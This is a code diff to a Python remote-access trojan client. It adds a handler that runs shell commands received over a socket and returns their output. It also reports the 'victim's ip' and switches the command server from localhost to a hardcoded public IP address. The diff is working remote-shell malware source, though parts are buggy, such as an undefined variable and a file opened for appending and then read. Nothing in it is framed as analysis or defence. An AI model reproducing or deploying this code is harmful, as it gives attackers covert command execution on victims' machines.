@@ -3,9 +3,53 @@ import threading
 import pickle
 import os
 import requests
+import subprocess
+from time import sleep
 
 state = {}
 pcname = os.getenv('COMPUTERNAME')
+
+def shell(serverSocket, command: str):
+
+    def shell():
+        output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+        return output
+
+    shel = threading.Thread(target=shell)
+    shel._running = True
+    shel.start()
+    sleep(1)
+    shel._running = False
+
+    result = str(shell().stdout.decode('CP437'))
+    numb = len(result)
+
+    if result != "":
+        if numb < 1:
+            serverSocket.send(b"/messageSend")
+            serverSocket.send(bytes("unrecognized command or no output was obtained", "utf-8"))
+
+        elif numb > 1990:
+            f1 = open("output.txt", 'a')
+            f1.write(result)
+            f1.close()
+
+            f1 = open("output.txt", 'a')
+            for line in f1:
+                file = file + line
+                print(line)
+
+            serverSocket.send(b"/messageSend")
+            serverSocket.send(bytes("Command successfully executed" + file, "utf-8"))
+
+            os.remove("output.txt")
+        else:
+            serverSocket.send(b"/messageSend")
+            serverSocket.send(bytes(f"Command successfully executed:\\n```\\n{result}```", "utf-8"))
+    else:
+        serverSocket.send(b"/messageSend")
+        serverSocket.send(bytes("unrecognized command or no output was obtained", "utf-8"))
+
 
 def serverListen(serverSocket):
     while True:
@@ -16,8 +60,27 @@ def serverListen(serverSocket):
             ip = r.text
             serverSocket.send(b"/messageSend")
             serverSocket.send(bytes("victim's ip: " + ip, "utf-8"))
+
+        elif "shell" in msg:
+            command = msg.replace("shell", "")
+            print(command)
+            shell(serverSocket, command)
+
+        elif msg == "blockinput":
+
+            serverSocket.send(b"/messageSend")
+            serverSocket.send(bytes("Succesfully blocked!", "utf-8"))
+
+        elif msg == "unblockinput":
+
+            serverSocket.send(b"/messageSend")
+            serverSocket.send(bytes("Succesfully unblocked!", "utf-8"))
+
         else:
             print(msg)
+
+
+
 
 
 
@@ -26,7 +89,7 @@ def serverListen(serverSocket):
 def main():
 
     serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    serverSocket.connect(("localhost", 8000))
+    serverSocket.connect(("139.144.79.212", 8000))
     state["inputCondition"] = threading.Condition()
     state["sendMessageLock"] = threading.Lock()
     state["username"] = pcname
